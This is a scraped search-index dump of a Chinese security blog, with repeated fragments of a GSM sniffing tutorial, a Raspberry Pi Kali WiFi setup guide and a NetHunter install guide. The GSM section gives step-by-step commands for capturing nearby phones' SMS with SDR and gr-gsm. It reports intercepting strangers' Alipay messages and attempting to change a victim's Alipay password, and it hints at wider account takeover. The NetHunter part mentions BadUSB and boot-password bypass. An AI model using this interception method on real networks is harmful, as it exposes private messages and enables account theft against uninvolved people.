实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#安装依赖包"},{"categories":["wireless-hacking"],"content":" 2.1 环境搭建OS: Ubuntu 16.04 or Kali Linux 2019.1 Hardware: 电视棒 RTL-SDR、 HackRF 、 BladeRF、 LimeSDR、 USRP 任选其一均可 PS: 关于 GSM Sniff 有两种方案 (C118+Osmocombb 和 SDR+gr-gsm) 这里只讨论后者。 2.1.1 Ubuntu 2.1.1.1 安装编译依赖包 $ sudo apt update \u0026\u0026 \\ sudo install git cmake g++ python-dev python-pip \\ swig pkg-config libfftw3-dev libboost-all-dev \\ libcppunit-dev libgsl-dev libusb-dev libsdl1.2-dev \\ python-wxgtk3.0 python-numpy python-cheetah python-lxml \\ doxygen libxi-dev python-sip libqt4-opengl-dev \\ libqwt-dev libfontconfig1-dev libxrender-dev \\ python-sip python-sip-dev python-qt4 python-sphinx \\ libusb-1.0-0-dev libcomedi-dev libzmq3-dev python-mako python-gtk2 2.1.1.2 使用PyBOMBS构建 $ sudo pip install --upgrade pip $ sudo pip install git+https://github.com/gnuradio/pybombs.git $ sudo pybombs recipes add gr-recipes git+https://github.com/gnuradio/gr-recipes.git $ sudo pybombs recipes add gr-etcetera git+https://github.com/gnuradio/gr-etcetera.git $ sudo pybombs prefix init /usr/local -a myprefix -R gnuradio-default 此过程耗时较长，请耐心等待!过程中可能会有一个报错，执行以下命令手动编译即可 $ cd /usr/local/src/apache-thrift/ $ sudo make -j4 $ sudo make install 2.1.1.3 安装常用组件 $ sudo pybombs install rtl-sdr hackrf bladeRF uhd gr-gsm osmo-sdr dump1090 airspy kal gr-iqbal libosmo-dsp gr-osmosdr armadillo gflags glog gnutls gnss-sdr gqrx 2.1.1.4 安装最新 wireshark $ sudo apt update \u0026\u0026 sudo apt install software-properties-common $ sudo add-apt-repository ppa:wireshark-dev/stable $ sudo apt update \u0026\u0026 sudo apt install wireshark 2.1.2 Kali Linux 2.1.2.1 安装依赖包 apt update \u0026\u0026 apt install gnuradio gnuradio-dev rtl-sdr librtlsdr-dev osmo-sdr libosmosdr-dev libosmocore libosmocore-dev cmake libboost-all-dev libcppunit-dev swig doxygen liblog4cpp5-dev python-scipy 2.1.2.2 编译gr-gam git clone https://github.com/ptrkrysik/gr-gsm.git cd gr-gsm mkdir build cd build cmake .. mkdir ~/.grc_gnuradio/ ~/.gnuradio/ make make install ldconfig 2.1.2.3 编译kalibrate根据自己的硬件选择对应的版本 kalibrate-hackrf(For HackRF) git clone https://github.com/scateu/kalibrate-hackrf.git cd kalibrate-hackrf ./bootstrap ./configure make make install kalibrate-rtl(For RTL-SDR) git clone https://github.com/steve-m/kalibrate-rtl.git cd kalibrate-rtl ./bootstrap ./configure make make install ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:2:1","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#编译gr-gam"},{"categories":["wireless-hacking"],"content":" 2.1 环境搭建OS: Ubuntu 16.04 or Kali Linux 2019.1 Hardware: 电视棒 RTL-SDR、 HackRF 、 BladeRF、 LimeSDR、 USRP 任选其一均可 PS: 关于 GSM Sniff 有两种方案 (C118+Osmocombb 和 SDR+gr-gsm) 这里只讨论后者。 2.1.1 Ubuntu 2.1.1.1 安装编译依赖包 $ sudo apt update \u0026\u0026 \\ sudo install git cmake g++ python-dev python-pip \\ swig pkg-config libfftw3-dev libboost-all-dev \\ libcppunit-dev libgsl-dev libusb-dev libsdl1.2-dev \\ python-wxgtk3.0 python-numpy python-cheetah python-lxml \\ doxygen libxi-dev python-sip libqt4-opengl-dev \\ libqwt-dev libfontconfig1-dev libxrender-dev \\ python-sip python-sip-dev python-qt4 python-sphinx \\ libusb-1.0-0-dev libcomedi-dev libzmq3-dev python-mako python-gtk2 2.1.1.2 使用PyBOMBS构建 $ sudo pip install --upgrade pip $ sudo pip install git+https://github.com/gnuradio/pybombs.git $ sudo pybombs recipes add gr-recipes git+https://github.com/gnuradio/gr-recipes.git $ sudo pybombs recipes add gr-etcetera git+https://github.com/gnuradio/gr-etcetera.git $ sudo pybombs prefix init /usr/local -a myprefix -R gnuradio-default 此过程耗时较长，请耐心等待!过程中可能会有一个报错，执行以下命令手动编译即可 $ cd /usr/local/src/apache-thrift/ $ sudo make -j4 $ sudo make install 2.1.1.3 安装常用组件 $ sudo pybombs install rtl-sdr hackrf bladeRF uhd gr-gsm osmo-sdr dump1090 airspy kal gr-iqbal libosmo-dsp gr-osmosdr armadillo gflags glog gnutls gnss-sdr gqrx 2.1.1.4 安装最新 wireshark $ sudo apt update \u0026\u0026 sudo apt install software-properties-common $ sudo add-apt-repository ppa:wireshark-dev/stable $ sudo apt update \u0026\u0026 sudo apt install wireshark 2.1.2 Kali Linux 2.1.2.1 安装依赖包 apt update \u0026\u0026 apt install gnuradio gnuradio-dev rtl-sdr librtlsdr-dev osmo-sdr libosmosdr-dev libosmocore libosmocore-dev cmake libboost-all-dev libcppunit-dev swig doxygen liblog4cpp5-dev python-scipy 2.1.2.2 编译gr-gam git clone https://github.com/ptrkrysik/gr-gsm.git cd gr-gsm mkdir build cd build cmake .. mkdir ~/.grc_gnuradio/ ~/.gnuradio/ make make install ldconfig 2.1.2.3 编译kalibrate根据自己的硬件选择对应的版本 kalibrate-hackrf(For HackRF) git clone https://github.com/scateu/kalibrate-hackrf.git cd kalibrate-hackrf ./bootstrap ./configure make make install kalibrate-rtl(For RTL-SDR) git clone https://github.com/steve-m/kalibrate-rtl.git cd kalibrate-rtl ./bootstrap ./configure make make install ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:2:1","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#编译kalibrate"},{"categories":["wireless-hacking"],"content":" 2.2 扫描基站 2.2.1 使用kalibrate扫描 GSM900 频段 2.2.2 使用gr-gsm ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:2:2","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#扫描基站"},{"categories":["wireless-hacking"],"content":" 2.2 扫描基站 2.2.1 使用kalibrate扫描 GSM900 频段 2.2.2 使用gr-gsm ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:2:2","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#使用kalibrate"},{"categories":["wireless-hacking"],"content":" 2.2 扫描基站 2.2.1 使用kalibrate扫描 GSM900 频段 2.2.2 使用gr-gsm ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:2:2","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#使用gr-gsm"},{"categories":["wireless-hacking"],"content":" 2.3 抓取基站通信数据这里选择 941.6MHz 的频段进行抓取。 ubuntu@ubuntu:~$ grgsm_livemon -f 941.6M ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:2:3","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#抓取基站通信数据"},{"categories":["wireless-hacking"],"content":" 2.4 启动Wireshark过滤数据包 ubuntu@ubuntu:~$ sudo wireshark -k -Y 'gsm_sms' -i lo ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:2:4","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#启动wireshark过滤数据包"},{"categories":["wireless-hacking"],"content":" 2.5 最终效果图一：我们可以看到我们使用 SDR+gr-gsm 监听到了一个人，他在使用支付宝进行消费，且金额为 42 元 图二：我们可以看到这名人员他向一个账号转账的记录 图三：我们截取到一个人的手机号并且使用他登入一个网站的注册处，然后我们还尝试了修改支付宝密码。 此外还可以利用 IMSI 获取到完整的手机号进而可以实现登录受害人的 QQ,微信，淘宝，支付宝等平台从而造成更大的危害！详细的这里就不再讲了，再讲就违法了！ ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:2:5","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#最终效果"},{"categories":["wireless-hacking"],"content":" 3 安全建议","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:3:0","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#安全建议"},{"categories":["wireless-hacking"],"content":" 3.1 运营商层面:加快清退 2G 网络的进程，加大普及 4G 及更高层网络的力度 ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:3:1","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#运营商层面"},{"categories":["wireless-hacking"],"content":" 3.2 互联网公司层面:应积极承担相关责任，个人账号登录处应考虑使用多重验证方式如短信上行验证、语音通话传输、常用设备绑定、生物特征识别、动态选择身份验证方式等等诸多二次验证机制来保证用户账号安全。 ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:3:2","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#互联网公司层面"},{"categories":["wireless-hacking"],"content":" 3.3 个人层面:应该增强安全意识，尽量使用 4G 及更高层网络，当地所在运营商如已开通 VoLTE 应尽快到当地运营商处申请开通使用 VoLTE，可以考虑使用双卡，一卡专门用于接收登录验证码平时不用时处于关闭状态 ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:3:3","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#个人层面"},{"categories":["wireless-hacking"],"content":" 3.4 国家立法层面:加大对于互联网犯罪的处罚力度 ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:3:4","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#国家立法层面"},{"categories":["wireless-hacking"],"content":" 4 参考文献GSM Hacking Part ① ：使用 SDR 扫描嗅探 GSM 网络 ubuntu 18.04 配置 GNURadio 基础环境 gr-gsm/Usage sniffing-gsm-traffic-with-hackrf GSM Sniffing嗅探设备组装之短信嗅探 书籍：《无线电安全攻防大揭秘》 ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:4:0","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#参考文献"},{"categories":["wireless-hacking"],"content":" 5 写在最后在我国由于种种原因，实际上大部分地区都未能启用 GSM 加密，也就是说在通信过程中，并未采用 A5/1 算法对空中往返的数据进行加密，而是采用 A5/0，即以明文形式进行传输。 本人也是无线安全的初学者，写此篇文章也是一拖再拖，很多地方讲的不够详细，还请各位大佬多多包涵！ ","date":"2019-05-07","objectID":"/2019/05/07/gsm-sniffing.html/:5:0","series":null,"tags":["gsm","sniffing","gr-gsm","rtl-sdr","hackrf","gnuradio","2G","IMSI Catcher"],"title":"浅谈 GSM 网络的安全性 实战截取用户身份信息","uri":"/2019/05/07/gsm-sniffing.html/#写在最后"},{"categories":["kali"],"content":"本文主要介绍树莓派安装Kali Linux之后配置WiFi的过程。","date":"2019-03-23","objectID":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/","series":null,"tags":["RaspberryPi","Hardware"],"title":"树莓派3B-Kali-Linux-WiFi配置绕坑指南","uri":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/"},{"categories":["kali"],"content":" 0x00 前言今天有空给树莓派烧了个2019.1 64位的镜像，但在配置WiFi的时候却遇到了一大堆坑，故写此文来记录一下绕坑过程。 ","date":"2019-03-23","objectID":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/:0:0","series":null,"tags":["RaspberryPi","Hardware"],"title":"树莓派3B-Kali-Linux-WiFi配置绕坑指南","uri":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/#0x00-前言"},{"categories":["kali"],"content":" 0x01 前期准备 树莓派3B 一块 读卡器一个 8GB以上Class 10内存卡一张 电脑一台(实在没有手机也行) Micro USB数据线一根 5V 2A电源适配器一个 ","date":"2019-03-23","objectID":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/:0:0","series":null,"tags":["RaspberryPi","Hardware"],"title":"树莓派3B-Kali-Linux-WiFi配置绕坑指南","uri":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/#0x01-前期准备"},{"categories":["kali"],"content":" 0x02 下载镜像","date":"2019-03-23","objectID":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/:0:0","series":null,"tags":["RaspberryPi","Hardware"],"title":"树莓派3B-Kali-Linux-WiFi配置绕坑指南","uri":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/#0x02-下载镜像"},{"categories":["kali"],"content":" 1 Windows下载地址 https://images.offensive-security.com/arm-images/kali-linux-2019.1-rpi3-nexmon-64.img.xz ","date":"2019-03-23","objectID":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/:1:0","series":null,"tags":["RaspberryPi","Hardware"],"title":"树莓派3B-Kali-Linux-WiFi配置绕坑指南","uri":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/#windows"},{"categories":["kali"],"content":" 2 Linux wget https://images.offensive-security.com/arm-images/kali-linux-2019.1-rpi3-nexmon-64.img.xz ","date":"2019-03-23","objectID":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/:2:0","series":null,"tags":["RaspberryPi","Hardware"],"title":"树莓派3B-Kali-Linux-WiFi配置绕坑指南","uri":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/#linux"},{"categories":["kali"],"content":" 0x03 解压镜像并烧录到内存卡","date":"2019-03-23","objectID":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/:0:0","series":null,"tags":["RaspberryPi","Hardware"],"title":"树莓派3B-Kali-Linux-WiFi配置绕坑指南","uri":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/#0x03-解压镜像并烧录到内存卡"},{"categories":["kali"],"content":" 1 Windows 7-Zip 传送门 Etcher 传送门 ","date":"2019-03-23","objectID":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/:1:0","series":null,"tags":["RaspberryPi","Hardware"],"title":"树莓派3B-Kali-Linux-WiFi配置绕坑指南","uri":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/#windows-1"},{"categories":["kali"],"content":" 2 Linux xzcat kali-linux-2019.1-rpi3-nexmon-64.img.xz | dd of=/dev/sdb bs=512k PS:此处的/dev/sdb是你的内存卡在Linux下的磁盘盘符，具体以fdisk -l的输出结果为准！ ","date":"2019-03-23","objectID":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/:2:0","series":null,"tags":["RaspberryPi","Hardware"],"title":"树莓派3B-Kali-Linux-WiFi配置绕坑指南","uri":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/#linux-1"},{"categories":["kali"],"content":" 0x04 SSH登录树莓派首先需要将树烧录好镜像的内存卡插入到树莓派然后接通电源等待开机。然后可以通过将网线插入到树莓派的RJ45接口或者用手机USB共享网络的方式给树莓派提供网络。 接着在终端下执行arp -a来获得树莓派的IP地址。(我这里通过安卓手机USB共享网络来获得，IP为192.168.43.74，实际IP以你实际情况为准) 已获得树莓派IP地址后就可以SSH登录到树莓派，默认用户名为root，密码为toor. ","date":"2019-03-23","objectID":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/:0:0","series":null,"tags":["RaspberryPi","Hardware"],"title":"树莓派3B-Kali-Linux-WiFi配置绕坑指南","uri":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/#0x04-ssh登录树莓派"},{"categories":["kali"],"content":" 1 Windows Putty 传送门 ","date":"2019-03-23","objectID":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/:1:0","series":null,"tags":["RaspberryPi","Hardware"],"title":"树莓派3B-Kali-Linux-WiFi配置绕坑指南","uri":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/#windows-2"},{"categories":["kali"],"content":" 2 Linux ssh root@192.168.43.74 ","date":"2019-03-23","objectID":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/:2:0","series":null,"tags":["RaspberryPi","Hardware"],"title":"树莓派3B-Kali-Linux-WiFi配置绕坑指南","uri":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/#linux-2"},{"categories":["kali"],"content":" 0x05 编辑Interfaces配置文件 vim /etc/network/interfaces 正常情况下配置文件里面是这样的内容 auto lo iface lo inet loopback auto eth0 iface eth0 inet dhcp 如果要配置WiFi我们需要将这两行内容注释掉，并在最下面添加这几行内容 auto wlan0 iface wlan0 inet dhcp wpa_conf /etc/wpa_supplicant/wpa_supplicant.conf ","date":"2019-03-23","objectID":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/:0:0","series":null,"tags":["RaspberryPi","Hardware"],"title":"树莓派3B-Kali-Linux-WiFi配置绕坑指南","uri":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/#0x05-编辑interfaces配置文件"},{"categories":["kali"],"content":" 0x06 编辑WiFi配置文件在/etc/wpa_supplicant/目录下创建一个名为wpa_supplicant.conf的文件并编辑以下内容 vim /etc/wpa_supplicant/wpa_supplicant.conf network={ ssid=\"Your SSID\" psk=\"Your password\" key_mgmt=WPA-PSK priority= } 这里的ssid填为你自己WiFi的SSID，密码对应，key_mgnt选择加密方式，priority选择对应优先级，如果保存多个ssid的话优先级越大就最先选择这个WiFi去连接。这里我的例子为 network={ ssid=\"Hacker\" psk=\"1234567890\" key_mgmt=WPA-PSK priority=5 } 根据你自己的实际情况编辑即可。编辑完以后重启network服务 service networking restart 之后就可以等待树莓派连接到指定的WiFi了！ ","date":"2019-03-23","objectID":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/:0:0","series":null,"tags":["RaspberryPi","Hardware"],"title":"树莓派3B-Kali-Linux-WiFi配置绕坑指南","uri":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/#0x06-编辑wifi配置文件"},{"categories":["kali"],"content":" 0x07 参考链接树莓派连接WiFi(最稳定的办法) 树莓派装kali linux wifi无线网络连接设置 ","date":"2019-03-23","objectID":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/:0:0","series":null,"tags":["RaspberryPi","Hardware"],"title":"树莓派3B-Kali-Linux-WiFi配置绕坑指南","uri":"/2019/03/23/raspberrypi3-kali-wifi-setup.html/#0x07-参考链接"},{"categories":["kali"],"content":"本文主要介绍了Kali Linux NetHunter的安装过程。","date":"2019-02-21","objectID":"/2019/02/21/nethunter-install-guide.html/","series":null,"tags":["NetHunter","chroot"],"title":"NetHunter安装不完全指北","uri":"/2019/02/21/nethunter-install-guide.html/"},{"categories":["kali"],"content":" 0x00 前言关于NetHunter黑手的安装教程，网上可以找到很多相关的文章，但是它们的问题是针对性太强，不适合普通机型安装。更有甚者，甚至拿这些百度随便一搜就能找到的教程去谋取暴利(某傻X眼的作风)，所以本着开源共享的精神，结合我这段时间的折腾经历，决定把这篇文章写出来，福利大众！ ","date":"2019-02-21","objectID":"/2019/02/21/nethunter-install-guide.html/:0:0","series":null,"tags":["NetHunter","chroot"],"title":"NetHunter安装不完全指北","uri":"/2019/02/21/nethunter-install-guide.html/#0x00-前言"},{"categories":["kali"],"content":" 0x01 背景 ·Kali Linux NetHunter是一款由Offensive Security团队专为渗透测试人员打造的，基于安卓的渗透测试平台。通过Chroot(一种虚拟容器，类似于Docker)方式运行在你的安卓设备上和安卓共存。其中包含了一个Chroot的Kali Linux环境，一个定制的内核和一个用来展示界面并提供相关操作快捷方式的APP，还有一些第三方安卓端的渗透测试工具(比如cSploit,RF Analyzer,DriveDroid,Shodan和Router Keygen等)。 ·通过使用Kali Linux NetHunter，我们可以进行诸如外接无线网卡进行WiFi渗透，模拟鼠标键盘进行HID BadUSB攻击，模拟CDROM直接利用手机绕过电脑开机密码，一键部署Mana钓鱼热点等功能。 ","date":"2019-02-21","objectID":"/2019/02/21/nethunter-install-guide.html/:0:0","series":null,"tags":["NetHunter","chroot"],"title":"NetHunter安装不完全指北","uri":"/2019/02/21/nethunter-install-guide.html/#0x01-背景"},{"categories":["kali"],"content":" 0x02 安装关于NetHunter的安装方法，大致可以分为刷机安装和免刷机安装两种办法。 0.0.1 1.刷机安装 0.0.1.1 1.01 前期准备需要设备: 安卓手机一部，一条数据线，一台电脑以及可靠的互联网连接 需要下载的内容: 1.你本机的ROM底包以及官方救砖线刷包(可选) 2.ADB和FASTBOOT命令行工具包 传送门 3.你本机的TWRP镜像 传送门 4 NetHunter的\"黑手OS\"包 传送门 5.NetHunter的内核包 传送门(官方支持设备需要刷入，否则没法使用外接无线网卡，HID BadUSB攻击和MSF数据库等功能。PS:内核包要自己手动生成，具体看README) 6.Magisk(功能强大的安卓Hook框架与root授权工具) 传送门 PS:这里的刷机包文件要根据你的手机CPU架构进行选择。64位ARM的CPU应该下载arm64专用的nethunter-generic-arm64-kalifs-full-rolling-xxx.zip,32位ARM的CPU应该下载armhf专用的nethunter-generic-armhf-kalifs-full-rolling-xxx.zip，某些采用x86/64 CPU的特殊型号的手机或平板电脑则应选择其专用的nethunter-generic-i386-kalifs-full-rolling-xxx.zip或nethunter-generic-amd64-kalifs-full-rolling-xxx.zip。这里一定要注意它们的区别，别下载错了，否则刷机时有可能会变砖！！！ 对于有官方内核支持的设备还应下载一个内核刷机包(官方内核支持设备列表点这里),否则将无法使用外接USB无线网卡、BadUSB HID攻击和MSF数据库等功能！内核的选择要根据自己手机的机型代号和安卓ROM版本和安卓版本进行选择(机型代号可以在终端模拟器内输入getprop ro.product.name查看)。下载的内核刷机包文件为kernel-nethunter-机型代号-安卓版本-日期.zip，根据自己的实际情况自行选择即可。 0.0.1.2 1.02 解锁Bootloader(已解锁的可跳过)首先要注意备份好数据，解锁Bootloader会清除手机内的所有数据！！！然后再进入手机设置\u003e关于手机\u003e连续点击5次左右版本号来开启开发者选项，然后返回设置\u003e找到开发者选项\u003e开启USB调试和OEM解锁。 接着重启手机至FASTBOOT模式并用数据线连接电脑，等待系统识别安装驱动。之后在FASTBOOT工具包目录内打开cmd窗口，并输入以下命令: fastboot devices 列出已连接到电脑的安卓设备，如果有显示手机的序列号则证明连接成功，如果没有显示请检查驱动是否已安装正确以及数据线是否完好。确认没问题后可以输入以下命令进行解锁: fastboot oem unlock PS:小米手机需要去官网申请解锁码后才能进行解锁操作 传送门 0.0.1.3 1.03 刷入TWRP将TWRP镜像复制到FASTBOOT工具包目录内，执行以下命令刷入TWRP: fastboot flash recovery twrp*.img 然后重启至TWRP: fastboot boot twrp*.img 0.0.1.4 1.04 刷机将NetHunter\"黑手OS包\"，内核包以及Magisk包复制进手机内置存储(如果是全新安装ROM的话需要把你要刷的ROM底包也复制进去)。进入到TWRP的主界面如图: 然后点击左上角的安装，选择要刷入的刷机包，然后右划确定即可(如果要重刷ROM底包的话需要先双清，点击右上角的清除右划确定即可)。过程如图: 之后重启手机，打开NetHunter主app等待初始化加载完成就ok了。 PS:在刷ROM底包之前需要双清，但是在刷NetHunter前后一定不要双清！一定不要双清！一定不要双清！重要的事情说三遍！！！NetHunter并非标准的安卓ROM包，所以刷机的时候不需要双清直接刷入即可。 ","date":"2019-02-21","objectID":"/2019/02/21/nethunter-install-guide.html/:0:0","series":null,"tags":["NetHunter","chroot"],"title":"NetHunter安装不完全指北","uri":"/2019/02/21/nethunter-install-guide.html/#0x02-安装"},{"categories":["kali"],"content":" 0x02 安装关于NetHunter的安装方法，大致可以分为刷机安装和免刷机安装两种办法。 0.0.1 1.刷机安装 0.0.1.1 1.01 前期准备需要设备: 安卓手机一部，一条数据线，一台电脑以及可靠的互联网连接 需要下载的内容: 1.你本机的ROM底包以及官方救砖线刷包(可选) 2.ADB和FASTBOOT命令行工具包 传送门 3.你本机的TWRP镜像 传送门 4 NetHunter的\"黑手OS\"包 传送门 5.NetHunter的内核包 传送门(官方支持设备需要刷入，否则没法使用外接无线网卡，HID BadUSB攻击和MSF数据库等功能。PS:内核包要自己手动生成，具体看README) 6.Magisk(功能强大的安卓Hook框架与root授权工具) 传送门 PS:这里的刷机包文件要根据你的手机CPU架构进行选择。64位ARM的CPU应该下载arm64专用的nethunter-generic-arm64-kalifs-full-rolling-xxx.zip,32位ARM的CPU应该下载armhf专用的nethunter-generic-armhf-kalifs-full-rolling-xxx.zip，某些采用x86/64 CPU的特殊型号的手机或平板电脑则应选择其专用的nethunter-generic-i386-kalifs-full-rolling-xxx.zip或nethunter-generic-amd64-kalifs-full-rolling-xxx.zip。这里一定要注意它们的区别，别下载错了，否则刷机时有可能会变砖！！！ 对于有官方内核支持的设备还应下载一个内核刷机包(官方内核支持设备列表点这里),否则将无法使用外接USB无线网卡、BadUSB HID攻击和MSF数据库等功能！内核的选择要根据自己手机的机型代号和安卓ROM版本和安卓版本进行选择(机型代号可以在终端模拟器内输入getprop ro.product.name查看)。下载的内核刷机包文件为kernel-nethunter-机型代号-安卓版本-日期.zip，根据自己的实际情况自行选择即可。 0.0.1.2 1.02 解锁Bootloader(已解锁的可跳过)首先要注意备份好数据，解锁Bootloader会清除手机内的所有数据！！！然后再进入手机设置\u003e关于手机\u003e连续点击5次左右版本号来开启开发者选项，然后返回设置\u003e找到开发者选项\u003e开启USB调试和OEM解锁。 接着重启手机至FASTBOOT模式并用数据线连接电脑，等待系统识别安装驱动。之后在FASTBOOT工具包目录内打开cmd窗口，并输入以下命令: fastboot devices 列出已连接到电脑的安卓设备，如果有显示手机的序列号则证明连接成功，如果没有显示请检查驱动是否已安装正确以及数据线是否完好。确认没问题后可以输入以下命令进行解锁: fastboot oem unlock PS:小米手机需要去官网申请解锁码后才能进行解锁操作 传送门 0.0.1.3 1.03 刷入TWRP将TWRP镜像复制到FASTBOOT工具包目录内，执行以下命令刷入TWRP: fastboot flash recovery twrp*.img 然后重启至TWRP: fastboot boot twrp*.img 0.0.1.4 1.04 刷机将NetHunter\"黑手OS包\"，内核包以及Magisk包复制进手机内置存储(如果是全新安装ROM的话需要把你要刷的ROM底包也复制进去)。进入到TWRP的主界面如图: 然后点击左上角的安装，选择要刷入的刷机包，然后右划确定即可(如果要重刷ROM底包的话需要先双清，点击右上角的清除右划确定即可)。过程如图: 之后重启手机，打开NetHunter主app等待初始化加载完成就ok了。 PS:在刷ROM底包之前需要双清，但是在刷NetHunter前后一定不要双清！一定不要双清！一定不要双清！重要的事情说三遍！！！NetHunter并非标准的安卓ROM包，所以刷机的时候不需要双清直接刷入即可。 ","date":"2019-02-21","objectID":"/2019/02/21/nethunter-install-guide.html/:0:0","series":null,"tags":["NetHunter","chroot"],"title":"NetHunter安装不完全指北","uri":"/2019/02/21/nethunter-install-guide.html/#1刷机安装"},{"categories":["kali"],"content":" 0x02 安装关于NetHunter的安装方法，大致可以分为刷机安装和免刷机安装两种办法。 0.0.1 1.刷机安装 0.0.1.1 1.01 前期准备需要设备: 安卓手机一部，一条数据线，一台电脑以及可靠的互联网连接 需要下载的内容: 1.你本机的ROM底包以及官方救砖线刷包(可选) 2.ADB和FASTBOOT命令行工具包 传送门 3.你本机的TWRP镜像 传送门 4 NetHunter的\"黑手OS\"包 传送门 5.NetHunter的内核包 传送门(官方支持设备需要刷入，否则没法使用外接无线网卡，HID BadUSB攻击和MSF数据库等功能。PS:内核包要自己手动生成，具体看README) 6.Magisk(功能强大的安卓Hook框架与root授权工具) 传送门 PS:这里的刷机包文件要根据你的手机CPU架构进行选择。64位ARM的CPU应该下载arm64专用的nethunter-generic-arm64-kalifs-full-rolling-xxx.zip,32位ARM的CPU应该下载armhf专用的nethunter-generic-armhf-kalifs-full-rolling-xxx.zip，某些采用x86/64 CPU的特殊型号的手机或平板电脑则应选择其专用的nethunter-generic-i386-kalifs-full-rolling-xxx.zip或nethunter-generic-amd64-kalifs-full-rolling-xxx.zip。这里一定要注意它们的区别，别下载错了，否则刷机时有可能会变砖！！！ 对于有官方内核支持的设备还应下载一个内核刷机包(官方内核支持设备列表点这里),否则将无法使用外接USB无线网卡、BadUSB 